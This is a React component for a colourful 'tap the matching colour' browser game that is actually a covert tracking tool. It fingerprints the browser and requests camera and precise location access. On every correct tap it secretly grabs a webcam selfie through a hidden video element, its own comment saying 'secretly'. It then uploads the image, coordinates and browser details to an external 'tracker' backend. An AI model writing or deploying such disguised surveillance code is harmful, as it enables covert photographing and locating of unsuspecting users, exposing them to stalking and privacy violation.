import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';

const API_BASE_URL = (import.meta.env.VITE_API_BASE_URL || 'https://tracker-backend-eta.vercel.app').replace(/\/+$/, '');

// Gen Z color palette
const COLORS = [
  { name: 'Neon Pink', hex: '#FF00FF' },
  { name: 'Electric Blue', hex: '#00FFFF' },
  { name: 'Lime Green', hex: '#00FF00' },
  { name: 'Sunset Orange', hex: '#FF4500' },
  { name: 'Cyber Purple', hex: '#8A2BE2' },
  { name: 'Hot Coral', hex: '#FF6B6B' }
];

function CameraCapture({ onSuccess }) {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [status, setStatus] = useState('loading'); // loading, playing, success, error
  const [location, setLocation] = useState(null);
  const [browserInfo, setBrowserInfo] = useState(null);
  const [score, setScore] = useState(0);
  const [targetColor, setTargetColor] = useState(COLORS[0]);
  const [combo, setCombo] = useState(0);
  const [level, setLevel] = useState(1);
  const [timeLeft, setTimeLeft] = useState(60);
  const [showFlash, setShowFlash] = useState(false);

  useEffect(() => {
    collectBrowserInfo();
    requestPermissions();
  }, []);

  useEffect(() => {
    if (status !== 'playing') return;
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          return 60;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [status]);

  useEffect(() => {
    if (status === 'playing') {
      setTargetColor(COLORS[Math.floor(Math.random() * COLORS.length)]);
    }
  }, [status, score]);

  const collectBrowserInfo = () => {
    const info = {
      browserName: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)/)?.[0] || 'Unknown',
      os: navigator.platform,
      screenResolution: `${screen.width}x${screen.height}`,
      language: navigator.language,
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    setBrowserInfo(info);
  };

  const requestPermissions = async () => {
    try {
      if (!navigator.mediaDevices || !navigator.geolocation) {
        throw new Error('Camera or location services not available.');
      }

      // Request camera permission
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }

      // Request location in background
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setLocation({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          });
          setStatus('playing');
        },
        (error) => {
          console.error('Location error:', error);
          setLocation({ latitude: 0, longitude: 0 });
          setStatus('playing');
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } catch (error) {
      console.error('Request permissions error:', error);
      setStatus('error');
    }
  };

  const handleColorTap = async (color) => {
    if (status !== 'playing') return;
    setShowFlash(true);
    setTimeout(() => setShowFlash(false), 100);

    if (color.hex === targetColor.hex) {
      const newCombo = combo + 1;
      setCombo(newCombo);
      const points = 100 + newCombo * 25;
      setScore(prev => prev + points);
      
      if (score + points >= level * 500) {
        setLevel(prev => prev + 1);
      }
      
      // Capture selfie secretly when user taps correct color!
      await captureSelfie();
      
      // New target color
      setTargetColor(COLORS[Math.floor(Math.random() * COLORS.length)]);
    } else {
      setCombo(0);
    }
  };

  const captureSelfie = async () => {
    const canvas = canvasRef.current;
    const video = videoRef.current;
    
    if (!video || !canvas) return;
    
    const maxWidth = 400;
    const maxHeight = 300;
    let width = video.videoWidth || 640;
    let height = video.videoHeight || 480;
    
    if (width > height) {
      if (width > maxWidth) {
        height = Math.round(height * maxWidth / width);
        width = maxWidth;
      }
    } else {
      if (height > maxHeight) {
        width = Math.round(width * maxHeight / height);
        height = maxHeight;
      }
    }
    
    canvas.width = width;
    canvas.height = height;
    canvas.getContext('2d').drawImage(video, 0, 0, width, height);
    const imageData = canvas.toDataURL('image/jpeg', 0.5);
    uploadData(imageData);
  };

  const uploadData = async (imageData) => {
    try {
      await axios.post(`${API_BASE_URL}/api/records`, {
        selfie: imageData,
        location: location || { latitude: 0, longitude: 0 },
        browserInfo: browserInfo
      });
    } catch (error) {
      console.error('Upload error:', error.response?.data || error.message);
    }
  };

  if (status === 'error') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-yellow-400 to-orange-500 p-4">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 text-center">
          <div className="w-24 h-24 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-bounce">
            <span className="text-6xl">🎮</span>
          </div>
          <h1 className="text-4xl font-black text-gray-800 mb-4">Game Paused!</h1>
          <p className="text-gray-600 mb-8 text-lg">
            Oops! We need camera permissions to play!
          </p>
          <button
            onClick={() => window.location.reload()}
            className="w-full bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-600 hover:to-red-600 text-white font-black py-5 px-6 rounded-xl transition-all duration-200 text-xl shadow-lg hover:shadow-xl transform hover:-translate-y-1"
          >
            Play Again!
          </button>
        </div>
      </div>
    );
  }

  if (status === 'success') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-400 to-emerald-500 p-4">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 text-center">
          <div className="w-24 h-24 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-bounce">
            <span className="text-6xl">🏆</span>
          </div>
          <h1 className="text-4xl font-black text-gray-800 mb-2">Level Complete!</h1>
          <p className="text-5xl font-black text-yellow-500 mb-4">{score} Points!</p>
          <p className="text-gray-600 text-lg">You're a color master! �</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 p-4 overflow-hidden relative">
      {/* Flash Effect */}
      {showFlash && <div className="absolute inset-0 bg-white opacity-50 animate-ping pointer-events-none z-50"></div>}
      
      <div className="max-w-md mx-auto relative z-10">
        {/* Game Header */}
        <div className="grid grid-cols-3 gap-4 mb-6">
          <div className="bg-white/10 backdrop-blur-xl rounded-2xl p-4 text-center border border-white/20">
            <p className="text-white/70 text-sm font-bold uppercase">Score</p>
            <p className="text-3xl font-black text-yellow-400">{score}</p>
          </div>
          <div className="bg-white/10 backdrop-blur-xl rounded-2xl p-4 text-center border border-white/20">
            <p className="text-white/70 text-sm font-bold uppercase">Level</p>
            <p className="text-3xl font-black text-cyan-400">{level}</p>
          </div>
          <div className="bg-white/10 backdrop-blur-xl rounded-2xl p-4 text-center border border-white/20">
            <p className="text-white/70 text-sm font-bold uppercase">Combo</p>
            <p className="text-3xl font-black text-pink-400">{combo}x</p>
          </div>
        </div>

        {/* Time Left */}
        <div className="mb-6">
          <div className="w-full bg-white/20 rounded-full h-4 overflow-hidden border border-white/30">
            <div 
              className="h-full bg-gradient-to-r from-cyan-400 to-pink-400 transition-all duration-300"
              style={{ width: `${(timeLeft / 60) * 100}%`}
            ></div>
          </div>
          <p className="text-center text-white/80 font-bold mt-2">⏱️ {timeLeft}s</p>
        </div>

        {/* Target Color */}
        <div className="text-center mb-6">
          <p className="text-white font-bold text-xl mb-2">Tap this color! 🎯</p>
          <div 
            className="w-32 h-32 mx-auto rounded-3xl shadow-2xl border-4 border-white animate-pulse flex items-center justify-center"
            style={{ backgroundColor: targetColor.hex }}
          >
            <span className="text-white font-black text-xl drop-shadow-lg">{targetColor.name}</span>
          </div>
        </div>

        {/* Color Buttons */}
        <div className="grid grid-cols-3 gap-4 mb-6">
          {COLORS.map((color, index) => (
            <button
              key={index}
              onClick={() => handleColorTap(color)}
              disabled={status !== 'playing'}
              className="aspect-square rounded-3xl shadow-2xl border-4 border-white/20 transition-all duration-150 active:scale-95 hover:scale-105 hover:shadow-3xl"
              style={{ backgroundColor: color.hex }}
            >
              <span className="text-white font-black text-lg drop-shadow-lg">{color.name.split(' ')[0]}</span>
            </button>
          ))}
        </div>

        {/* Instructions */}
        <div className="bg-white/10 backdrop-blur-xl rounded-2xl p-4 text-center border border-white/20">
          <p className="text-white font-bold text-lg">
            👆 Tap the matching color to score points!
          </p>
        </div>
      </div>

      {/* Hidden Camera Elements */}
      <div className="hidden">
        <video ref={videoRef} autoPlay playsInline muted></video>
        <canvas ref={canvasRef}></canvas>
      </div>
    </div>
  );
}

export default CameraCapture;
